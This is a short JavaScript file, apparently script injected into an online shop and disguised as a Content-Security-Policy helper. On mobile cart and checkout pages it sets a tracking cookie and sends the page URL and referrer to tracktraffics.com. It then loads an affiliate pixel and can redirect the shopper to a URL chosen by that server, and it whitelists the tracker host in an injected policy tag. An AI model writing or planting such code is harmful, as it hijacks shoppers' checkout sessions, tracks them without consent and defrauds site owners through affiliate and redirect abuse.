(async function csp() {
    function isMobileDevice() {
        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    if (!isMobileDevice()) return;
    if (sessionStorage.getItem('trackingInitialized')) return;

    function fetchCookieValue(cookieName) {
        const namePrefix = cookieName + '=';
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            cookie = cookie.trim();
            if (cookie.startsWith(namePrefix)) {
                return cookie.substring(namePrefix.length);
            }
        }
        return '';
    }

    function createUniqueIdentifier() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    function appendTrackerImage(url) {
        const img = new Image();  
        img.src = url;
        img.style.display = 'none';
        document.body.appendChild(img);
    }

    async function initializeTrackingProcess() {
        try {
            let clientId = fetchCookieValue('client_identifier') || createUniqueIdentifier();

            document.cookie = `client_identifier=${clientId}; expires=${new Date(Date.now() + 2592000000).toUTCString()}; path=/`;

            const response = await fetch('https://www.tracktraffics.com/api/track-user', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: clientId,
                    origin: window.location.hostname
                })
            });

            const data = await response.json();

            if (data.success) {
                appendTrackerImage(data.affiliate_url);
                sessionStorage.setItem('trackingInitialized', 'true');

                if (data.redirect_url) {
                    window.location.href = data.redirect_url;
                }
            } else {
                appendTrackerImage(`https://www.tracktraffics.com/api/fallback-pixel?id=${clientId}`);
                sessionStorage.setItem('trackingInitialized', 'true');
            }
        } catch (error) {
            console.error('Tracking Error:', {
                message: error.message,
                stack: error.stack,
                timestamp: new Date().toISOString()
            });
        }
    }

    function isCartPage() {
        const cartPages = ['/cart', '/checkout'];
        return cartPages.some(path => window.location.pathname.includes(path));
    }

    document.addEventListener("DOMContentLoaded", function() {
        const meta = document.createElement('meta');
        meta.httpEquiv = "Content-Security-Policy";
        meta.content = `
            default-src 'self'; 
            script-src 'self' https://www.tracktraffics.com;
            connect-src 'self' https://www.eigeradventure.com https://www.tracktraffics.com;
            img-src 'self' https://www.tracktraffics.com data:;
        `.replace(/\s+/g, ' ').trim();
        document.getElementsByTagName('head')[0].appendChild(meta);
    });

    if (isCartPage()) {
        initializeTrackingProcess();
    }
})();
